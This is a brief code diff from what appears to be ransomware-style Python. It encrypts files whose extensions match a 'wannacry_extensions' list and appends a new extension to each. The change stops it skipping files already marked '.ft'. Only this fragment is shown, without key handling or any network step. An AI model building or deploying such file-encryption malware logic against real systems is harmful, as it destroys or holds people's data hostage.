@@ -73,5 +73,4 @@ def encryption(key: bytes, path: str, silent: bool)-> None:
             if file_extension not in wannacry_extensions:
                 continue
             encrypt_file(key, filepath)
-            if file_extension != ".ft":
-                add_extension(filepath)
+            add_extension(filepath)
